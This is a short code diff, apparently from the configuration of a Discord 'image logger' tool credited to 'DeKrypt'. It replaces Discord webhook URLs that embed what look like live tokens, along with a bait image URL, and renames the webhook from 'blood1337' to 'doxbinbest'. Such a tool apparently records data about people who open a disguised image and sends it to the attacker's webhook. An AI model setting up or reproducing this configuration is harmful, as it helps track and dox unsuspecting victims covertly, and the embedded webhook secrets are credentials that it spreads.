@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1146385706160226424/6nJfbRi-9PeB1hO8AGC-sWUJTN-XtB2Y4KjiXvITfyvzdUsUkukCqcyNJepczFHk8qN6",
-    "image": "https://cdn.discordapp.com/attachments/1118887222159085588/1146393477601562635/Screenshot_2023-08-30-12-15-24-047_com.instagram.android-edit.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1155197665831825408/DuRcUGyRKz33GMBfh_LsN19WrUjRIFKndvi_2GZXXy102nHIyIOZAPv5ot2rg9N6t2Qv",
+    "image": "https://cdn.discordapp.com/attachments/1155196353085964371/1155201383453175987/indir_43.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "blood1337", # Set this to the name you want the webhook to have
+    "username": "doxbinbest", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
